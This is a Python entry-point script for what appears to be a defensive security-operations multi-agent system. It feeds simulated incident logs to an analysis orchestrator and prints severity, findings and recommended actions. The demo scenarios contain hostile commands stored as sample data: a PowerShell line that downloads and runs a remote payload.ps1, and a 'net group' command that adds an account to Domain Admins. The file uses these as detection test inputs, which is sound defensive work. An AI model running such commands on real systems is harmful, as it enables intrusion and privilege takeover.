"""
SOC AI Multi-Agent System — Main Entry Point
Usage:
  python main.py --mode demo        # Run demo scenarios
  python main.py --mode eval        # Run full training evaluation
  python main.py --mode test        # Run pytest suite
  python main.py --mode single      # Analyse a single log line (interactive)
"""

import argparse
import json
import subprocess
import sys
from pathlib import Path


def demo_mode():
    """Run a set of realistic attack scenarios through the full pipeline."""
    from agents import SOCOrchestrator

    orchestrator = SOCOrchestrator()

    scenarios = [
        {
            "name": "🔴 CRITICAL: Brute Force → Priv Esc → Lateral Movement → Exfiltration",
            "input": {
                "raw_log": "Jun 01 02:14:33 dc01 sshd: Failed password for root from 198.51.100.22",
                "events": [
                    {"time": f"02:14:3{i}", "user": ["admin","root","guest","test"][i%4],
                     "src_ip": "198.51.100.22", "result": "Failed", "host": "dc01"}
                    for i in range(5)
                ] + [
                    {"time": "02:17:00", "host": "dc01", "process": "net.exe",
                     "cmdline": "net group 'Domain Admins' hacker /add", "user": "admin"},
                    {"time": "02:20:00", "src_host": "dc01", "dst_host": "fin-srv02",
                     "user": "hacker", "method": "WMI"},
                    {"time": "03:00:00", "host": "fin-srv02", "dst_ip": "45.33.32.156",
                     "size_mb": 450, "user": "hacker"},
                ],
            },
        },
        {
            "name": "🟠 HIGH: Suspicious PowerShell + C2 Beaconing",
            "input": {
                "raw_log": "2024-06-01T14:10:00Z host=ws22 EventID=4688 process=powershell.exe cmdline=IEX(New-Object Net.WebClient).DownloadString user=CORP\\bob",
                "events": [
                    {"time": "14:10:00", "host": "ws22", "process": "powershell.exe",
                     "cmdline": "IEX(New-Object Net.WebClient).DownloadString('http://192.168.100.5/payload.ps1')",
                     "user": "CORP\\bob"},
                    *[{"time": f"1{h}:00:00", "host": "ws22", "dst_ip": "198.51.100.99",
                       "interval_sec": 300} for h in range(4, 9)],
                ],
            },
        },
        {
            "name": "🟡 HIGH: Cloud IAM Privilege Escalation (No MFA)",
            "input": {
                "raw_log": "2024-06-01T22:30:00Z aws_account=123456 event=CreateAccessKey user=svc_backup mfa=false",
                "events": [
                    {"time": "22:30:00", "user": "svc_backup", "action": "CreateAccessKey", "result": "Success"},
                    {"time": "22:31:00", "user": "svc_backup", "action": "AttachUserPolicy",
                     "policy": "AdministratorAccess", "result": "Success"},
                ],
            },
        },
        {
            "name": "🟢 BENIGN: Normal Domain Login (Expected Activity)",
            "input": {
                "raw_log": "2024-06-01T09:00:01Z host=dc01 EventID=4624 Account=CORP\\jsmith LogonType=3 SourceIP=10.0.1.50"
            },
        },
    ]

    print("\n" + "═" * 72)
    print("   SOC AI MULTI-AGENT SYSTEM — LIVE DEMO")
    print("═" * 72)

    for scenario in scenarios:
        print(f"\n{'─' * 72}")
        print(f"  Scenario: {scenario['name']}")
        print("─" * 72)

        result = orchestrator.run(scenario["input"])
        out = result["result"]

        print(f"  Severity  : {out.get('severity', 'N/A')}")
        print(f"  Confidence: {out.get('confidence', 'N/A')}")
        print(f"  Pipeline  : {out.get('pipeline_elapsed_sec', 'N/A')}s")
        print(f"\n  Executive Summary:")
        print(f"  {out.get('executive_summary', 'N/A')}")

        findings = out.get("key_findings", [])
        if findings:
            print(f"\n  Key Findings:")
            for f in findings:
                print(f"    • {f}")

        timeline = out.get("correlated_attack_timeline", [])
        if timeline:
            print(f"\n  Attack Timeline ({len(timeline)} stage(s)):")
            for t in timeline:
                print(f"    [{t.get('stage','?')}] {t.get('event','?')}")

        actions = out.get("recommended_actions", {})
        if actions:
            p1 = actions.get("P1", [])
            if p1:
                print(f"\n  Immediate P1 Actions:")
                for a in p1[:3]:
                    print(f"    ⚡ {a}")

        qc = out.get("quality_control_notes", [])
        print(f"\n  QC: {qc[0] if qc else 'N/A'}")

    print(f"\n{'═' * 72}")
    print("  Demo complete.")
    print(f"{'═' * 72}\n")


def eval_mode():
    """Run the full training & evaluation pipeline."""
    sys.path.insert(0, str(Path(__file__).parent))
    from data.training_data import save_training_data
    from models.evaluator import run_all_tests

    print("\n[1/2] Generating training data…")
    save_training_data("data/training_data.json")

    print("[2/2] Running evaluations…")
    results = run_all_tests("reports/test_results.json")

    print(f"\nOverall: {results['overall_system_score']} → {results['overall_grade']}")
    return results


def test_mode():
    """Run the pytest suite."""
    result = subprocess.run(
        [sys.executable, "-m", "pytest", "tests/test_agents.py", "-v", "--tb=short"],
        capture_output=False
    )
    sys.exit(result.returncode)


def single_mode():
    """Interactive single log analysis."""
    from agents import SOCOrchestrator
    orchestrator = SOCOrchestrator()

    print("\nSOC AI — Single Log Analyser")
    print("Enter a log line (or 'quit' to exit):\n")

    while True:
        try:
            log = input("LOG> ").strip()
        except (KeyboardInterrupt, EOFError):
            break
        if log.lower() in ("quit", "exit", "q"):
            break
        if not log:
            continue

        result = orchestrator.run({"raw_log": log})
        out = result["result"]
        print(f"\n  Severity  : {out.get('severity')}")
        print(f"  Summary   : {out.get('executive_summary')}")
        findings = out.get("key_findings", [])
        for f in findings:
            print(f"  • {f}")
        print()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SOC AI Multi-Agent System")
    parser.add_argument(
        "--mode",
        choices=["demo", "eval", "test", "single"],
        default="demo",
        help="Execution mode (default: demo)"
    )
    args = parser.parse_args()

    if args.mode == "demo":
        demo_mode()
    elif args.mode == "eval":
        eval_mode()
    elif args.mode == "test":
        test_mode()
    elif args.mode == "single":
        single_mode()
